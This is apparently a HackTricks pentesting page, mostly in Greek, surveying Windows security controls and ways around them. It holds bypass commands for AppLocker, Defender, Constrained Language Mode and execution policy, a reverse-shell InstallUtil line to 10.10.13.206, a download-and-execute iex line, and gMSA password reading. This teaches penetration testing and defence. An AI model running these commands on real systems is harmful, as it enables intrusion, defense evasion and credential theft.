# Windows Security Controls

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Policy

Μια λίστα λευκών εφαρμογών είναι μια λίστα εγκεκριμένων λογισμικών εφαρμογών ή εκτελέσιμων που επιτρέπεται να είναι παρόντα και να εκτελούνται σε ένα σύστημα. Ο στόχος είναι να προστατευθεί το περιβάλλον από κακόβουλο λογισμικό και μη εγκεκριμένο λογισμικό που δεν ευθυγραμμίζεται με τις συγκεκριμένες επιχειρηματικές ανάγκες ενός οργανισμού.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **λύση λευκής λίστας εφαρμογών** της Microsoft και δίνει στους διαχειριστές συστημάτων έλεγχο πάνω σε **ποια εφαρμογές και αρχεία μπορούν να εκτελούν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** πάνω σε εκτελέσιμα, σενάρια, αρχεία εγκατάστασης Windows, DLLs, πακέτα εφαρμογών και εγκαταστάτες πακέτων εφαρμογών.\
Είναι κοινό για τους οργανισμούς να **μπλοκάρουν το cmd.exe και το PowerShell.exe** και την εγγραφή σε ορισμένους καταλόγους, **αλλά όλα αυτά μπορούν να παρακαμφθούν**.

### Check

Έλεγχος ποια αρχεία/επεκτάσεις είναι στη μαύρη/λευκή λίστα:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Αυτή η διαδρομή μητρώου περιέχει τις ρυθμίσεις και τις πολιτικές που εφαρμόζονται από το AppLocker, παρέχοντας έναν τρόπο για να αναθεωρήσετε το τρέχον σύνολο κανόνων που επιβάλλονται στο σύστημα:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Παράκαμψη

- Χρήσιμες **Εγγράψιμες φακέλους** για να παρακάμψετε την πολιτική του AppLocker: Εάν το AppLocker επιτρέπει την εκτέλεση οτιδήποτε μέσα στο `C:\Windows\System32` ή `C:\Windows`, υπάρχουν **εγγράψιμοι φάκελοι** που μπορείτε να χρησιμοποιήσετε για να **παρακάμψετε αυτό**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Συνήθως **έμπιστοι** [**"LOLBAS's"**](https://lolbas-project.github.io/) δυαδικοί κωδικοί μπορεί να είναι επίσης χρήσιμοι για να παρακαμφθεί το AppLocker.
- **Κακώς γραμμένοι κανόνες θα μπορούσαν επίσης να παρακαμφθούν**
- Για παράδειγμα, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο με όνομα `allowed`** οπουδήποτε και θα επιτραπεί.
- Οι οργανισμοί συχνά επικεντρώνονται στο **να μπλοκάρουν το `%System32%\WindowsPowerShell\v1.0\powershell.exe` εκτελέσιμο**, αλλά ξεχνούν τις **άλλες** [**τοποθεσίες εκτελέσιμων PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) όπως το `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή το `PowerShell_ISE.exe`.
- **Η επιβολή DLL σπάνια είναι ενεργοποιημένη** λόγω του επιπλέον φορτίου που μπορεί να επιφέρει σε ένα σύστημα, και της ποσότητας δοκιμών που απαιτούνται για να διασφαλιστεί ότι τίποτα δεν θα σπάσει. Έτσι, η χρήση **DLLs ως πίσω πόρτες θα βοηθήσει στην παράκαμψη του AppLocker**.
- Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διαδικασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Αποθήκευση Διαπιστευτηρίων

### Διαχειριστής Λογαριασμών Ασφαλείας (SAM)

Τα τοπικά διαπιστευτήρια είναι παρόντα σε αυτό το αρχείο, οι κωδικοί πρόσβασης είναι κατακερματισμένοι.

### Τοπική Αρχή Ασφαλείας (LSA) - LSASS

Τα **διαπιστευτήρια** (κατακερματισμένα) είναι **αποθηκευμένα** στη **μνήμη** αυτού του υποσυστήματος για λόγους Ενιαίας Σύνδεσης.\
Η **LSA** διαχειρίζεται την τοπική **πολιτική ασφαλείας** (πολιτική κωδικών πρόσβασης, δικαιώματα χρηστών...), **αυθεντικοποίηση**, **tokens πρόσβασης**...\
Η LSA θα είναι αυτή που θα **ελέγξει** τα παρεχόμενα διαπιστευτήρια μέσα στο **αρχείο SAM** (για τοπική σύνδεση) και θα **μιλήσει** με τον **ελεγκτή τομέα** για να αυθεντικοποιήσει έναν χρήστη τομέα.

Τα **διαπιστευτήρια** είναι **αποθηκευμένα** μέσα στη **διαδικασία LSASS**: εισιτήρια Kerberos, κατακερματισμοί NT και LM, εύκολα αποκρυπτογραφημένοι κωδικοί πρόσβασης.

### Μυστικά LSA

Η LSA θα μπορούσε να αποθηκεύσει στο δίσκο κάποια διαπιστευτήρια:

- Κωδικός πρόσβασης του λογαριασμού υπολογιστή του Active Directory (μη προσβάσιμος ελεγκτής τομέα).
- Κωδικοί πρόσβασης των λογαριασμών υπηρεσιών Windows
- Κωδικοί πρόσβασης για προγραμματισμένα καθήκοντα
- Περισσότερα (κωδικός πρόσβασης εφαρμογών IIS...)

### NTDS.dit

Είναι η βάση δεδομένων του Active Directory. Είναι παρούσα μόνο στους Ελεγκτές Τομέα.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) είναι ένα Antivirus που είναι διαθέσιμο στα Windows 10 και Windows 11, και σε εκδόσεις του Windows Server. **Μπλοκάρει** κοινά εργαλεία pentesting όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι για να **παρακαμφθούν αυτές οι προστασίες**.

### Έλεγχος

Για να ελέγξετε την **κατάσταση** του **Defender** μπορείτε να εκτελέσετε το PS cmdlet **`Get-MpComputerStatus`** (ελέγξτε την τιμή του **`RealTimeProtectionEnabled`** για να δείτε αν είναι ενεργό):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Για να το απαριθμήσετε μπορείτε επίσης να εκτελέσετε:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Κρυπτογραφημένο Σύστημα Αρχείων (EFS)

Το EFS ασφαλίζει τα αρχεία μέσω κρυπτογράφησης, χρησιμοποιώντας ένα **συμμετρικό κλειδί** γνωστό ως το **Κλειδί Κρυπτογράφησης Αρχείου (FEK)**. Αυτό το κλειδί κρυπτογραφείται με το **δημόσιο κλειδί** του χρήστη και αποθηκεύεται μέσα στο $EFS **εναλλακτικό ρεύμα δεδομένων** του κρυπτογραφημένου αρχείου. Όταν απαιτείται αποκρυπτογράφηση, χρησιμοποιείται το αντίστοιχο **ιδιωτικό κλειδί** του ψηφιακού πιστοποιητικού του χρήστη για να αποκρυπτογραφηθεί το FEK από το ρεύμα $EFS. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [εδώ](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Σενάρια αποκρυπτογράφησης χωρίς πρωτοβουλία του χρήστη** περιλαμβάνουν:

- Όταν αρχεία ή φάκελοι μετακινούνται σε ένα μη EFS σύστημα αρχείων, όπως το [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), αποκρυπτογραφούνται αυτόματα.
- Κρυπτογραφημένα αρχεία που αποστέλλονται μέσω του δικτύου μέσω του πρωτοκόλλου SMB/CIFS αποκρυπτογραφούνται πριν από τη μετάδοση.

Αυτή η μέθοδος κρυπτογράφησης επιτρέπει **διαφανή πρόσβαση** σε κρυπτογραφημένα αρχεία για τον κάτοχο. Ωστόσο, απλώς αλλάζοντας τον κωδικό πρόσβασης του κατόχου και συνδεόμενος δεν επιτρέπει την αποκρυπτογράφηση.

**Κύρια Σημεία**:

- Το EFS χρησιμοποιεί ένα συμμετρικό FEK, κρυπτογραφημένο με το δημόσιο κλειδί του χρήστη.
- Η αποκρυπτογράφηση χρησιμοποιεί το ιδιωτικό κλειδί του χρήστη για να αποκτήσει πρόσβαση στο FEK.
- Αυτόματη αποκρυπτογράφηση συμβαίνει υπό συγκεκριμένες συνθήκες, όπως η αντιγραφή σε FAT32 ή η μετάδοση μέσω δικτύου.
- Τα κρυπτογραφημένα αρχεία είναι προσβάσιμα στον κάτοχο χωρίς επιπλέον βήματα.

### Έλεγχος πληροφοριών EFS

Ελέγξτε αν ένας **χρήστης** έχει **χρησιμοποιήσει** αυτή την **υπηρεσία** ελέγχοντας αν υπάρχει αυτή η διαδρομή:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Ελέγξτε **ποιος** έχει **πρόσβαση** στο αρχείο χρησιμοποιώντας cipher /c \<file>\
Μπορείτε επίσης να χρησιμοποιήσετε `cipher /e` και `cipher /d` μέσα σε έναν φάκελο για να **κρυπτογραφήσετε** και **αποκρυπτογραφήσετε** όλα τα αρχεία

### Αποκρυπτογράφηση αρχείων EFS

#### Όντας Σύστημα Εξουσίας

Αυτή η μέθοδος απαιτεί ο **θύμα χρήστης** να είναι **σε εκτέλεση** μια **διαδικασία** μέσα στον υπολογιστή. Αν αυτό ισχύει, χρησιμοποιώντας μια συνεδρία `meterpreter` μπορείτε να προσποιηθείτε το διακριτικό της διαδικασίας του χρήστη (`impersonate_token` από `incognito`). Ή μπορείτε απλώς να `migrate` στη διαδικασία του χρήστη.

#### Γνωρίζοντας τον κωδικό πρόσβασης του χρήστη

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Ομαδικοί Διαχειριζόμενοι Λογαριασμοί Υπηρεσιών (gMSA)

Η Microsoft ανέπτυξε τους **Ομαδικούς Διαχειριζόμενους Λογαριασμούς Υπηρεσιών (gMSA)** για να απλοποιήσει τη διαχείριση των λογαριασμών υπηρεσιών στις υποδομές IT. Σε αντίθεση με τους παραδοσιακούς λογαριασμούς υπηρεσιών που συχνά έχουν ενεργοποιημένη την ρύθμιση "**Ο κωδικός πρόσβασης δεν λήγει ποτέ**", οι gMSA προσφέρουν μια πιο ασφαλή και διαχειρίσιμη λύση:

- **Αυτόματη Διαχείριση Κωδικών Πρόσβασης**: Οι gMSA χρησιμοποιούν έναν πολύπλοκο, 240-χαρακτήρων κωδικό πρόσβασης που αλλάζει αυτόματα σύμφωνα με την πολιτική τομέα ή υπολογιστή. Αυτή η διαδικασία διαχειρίζεται από την Υπηρεσία Κατανομής Κλειδιών της Microsoft (KDC), εξαλείφοντας την ανάγκη για χειροκίνητες ενημερώσεις κωδικών πρόσβασης.
- **Ενισχυμένη Ασφάλεια**: Αυτοί οι λογαριασμοί είναι ανθεκτικοί σε κλειδώματα και δεν μπορούν να χρησιμοποιηθούν για διαδραστικές συνδέσεις, ενισχύοντας την ασφάλειά τους.
- **Υποστήριξη Πολλών Υπολογιστών**: Οι gMSA μπορούν να μοιράζονται σε πολλούς υπολογιστές, καθιστώντας τους ιδανικούς για υπηρεσίες που εκτελούνται σε πολλούς διακομιστές.
- **Δυνατότητα Προγραμματισμένων Εργασιών**: Σε αντίθεση με τους διαχειριζόμενους λογαριασμούς υπηρεσιών, οι gMSA υποστηρίζουν την εκτέλεση προγραμματισμένων εργασιών.
- **Απλοποιημένη Διαχείριση SPN**: Το σύστημα ενημερώνει αυτόματα το Όνομα Κύριας Υπηρεσίας (SPN) όταν υπάρχουν αλλαγές στα στοιχεία sAMaccount του υπολογιστή ή στο DNS όνομα, απλοποιώντας τη διαχείριση SPN.

Οι κωδικοί πρόσβασης για τους gMSA αποθηκεύονται στην ιδιότητα LDAP _**msDS-ManagedPassword**_ και επαναρυθμίζονται αυτόματα κάθε 30 ημέρες από τους Ελεγκτές Τομέα (DCs). Αυτός ο κωδικός πρόσβασης, ένα κρυπτογραφημένο blob δεδομένων γνωστό ως [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από εξουσιοδοτημένους διαχειριστές και τους διακομιστές στους οποίους είναι εγκατεστημένοι οι gMSA, εξασφαλίζοντας ένα ασφαλές περιβάλλον. Για να αποκτήσετε πρόσβαση σε αυτές τις πληροφορίες, απαιτείται μια ασφαλής σύνδεση όπως το LDAPS ή η σύνδεση πρέπει να είναι αυθεντικοποιημένη με 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Μπορείτε να διαβάσετε αυτόν τον κωδικό πρόσβασης με [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Βρείτε περισσότερες πληροφορίες σε αυτή την ανάρτηση**](https://cube0x0.github.io/Relaying-for-gMSA/)

Επίσης, ελέγξτε αυτήν την [ιστοσελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με το πώς να εκτελέσετε μια **επίθεση NTLM relay** για να **διαβάσετε** τον **κωδικό πρόσβασης** του **gMSA**.

## LAPS

Η **Λύση Κωδικού Πρόσβασης Τοπικού Διαχειριστή (LAPS)**, διαθέσιμη για λήψη από [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των κωδικών πρόσβασης τοπικών διαχειριστών. Αυτοί οι κωδικοί πρόσβασης, οι οποίοι είναι **τυχαίοι**, μοναδικοί και **τακτικά αλλάζουν**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς πρόσβασης περιορίζεται μέσω ACLs σε εξουσιοδοτημένους χρήστες. Με επαρκείς άδειες, παρέχεται η δυνατότητα ανάγνωσης των κωδικών πρόσβασης τοπικών διαχειριστών.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που απαιτούνται για τη χρήση του PowerShell αποτελεσματικά, όπως η μπλοκάρισμα COM αντικειμένων, η επιτρεπόμενη μόνο χρήση εγκεκριμένων τύπων .NET, ροές εργασίας βασισμένες σε XAML, κλάσεις PowerShell και άλλα.

### **Έλεγχος**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Παράκαμψη
```powershell
#Easy bypass
Powershell -version 2
```
Στα τρέχοντα Windows, αυτή η παράκαμψη δεν θα λειτουργήσει, αλλά μπορείτε να χρησιμοποιήσετε [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Για να το μεταγλωττίσετε, μπορεί να χρειαστεί** **να** _**Προσθέσετε μια Αναφορά**_ -> _Περιήγηση_ -> _Περιήγηση_ -> προσθέστε `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` και **να αλλάξετε το έργο σε .Net4.5**.

#### Άμεση παράκαμψη:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Αντίστροφη θήκη:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διαδικασία και να παρακάμψετε τη περιορισμένη λειτουργία. Για περισσότερες πληροφορίες δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Πολιτική Εκτέλεσης PS

Από προεπιλογή είναι ρυθμισμένη σε **restricted.** Κύριοι τρόποι για να παρακάμψετε αυτή την πολιτική:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Είναι το API που μπορεί να χρησιμοποιηθεί για την αυθεντικοποίηση χρηστών.

Το SSPI θα είναι υπεύθυνο για την εύρεση του κατάλληλου πρωτοκόλλου για δύο μηχανές που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος γι' αυτό είναι το Kerberos. Στη συνέχεια, το SSPI θα διαπραγματευτεί ποιο πρωτόκολλο αυθεντικοποίησης θα χρησιμοποιηθεί, αυτά τα πρωτόκολλα αυθεντικοποίησης ονομάζονται Security Support Provider (SSP), βρίσκονται μέσα σε κάθε μηχανή Windows με τη μορφή DLL και και οι δύο μηχανές πρέπει να υποστηρίζουν το ίδιο για να μπορέσουν να επικοινωνήσουν.

### Main SSPs

- **Kerberos**: Η προτιμώμενη
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** και **NTLMv2**: Λόγοι συμβατότητας
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers και LDAP, κωδικός πρόσβασης με τη μορφή MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL και TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Χρησιμοποιείται για να διαπραγματευτεί το πρωτόκολλο που θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos να είναι το προεπιλεγμένο)
- %windir%\Windows\System32\lsasrv.dll

#### Η διαπραγμάτευση θα μπορούσε να προσφέρει αρκετές μεθόδους ή μόνο μία.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που ενεργοποιεί μια **προτροπή συγκατάθεσης για ανυψωμένες δραστηριότητες**.

{{#ref}}
uac-user-account-control.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
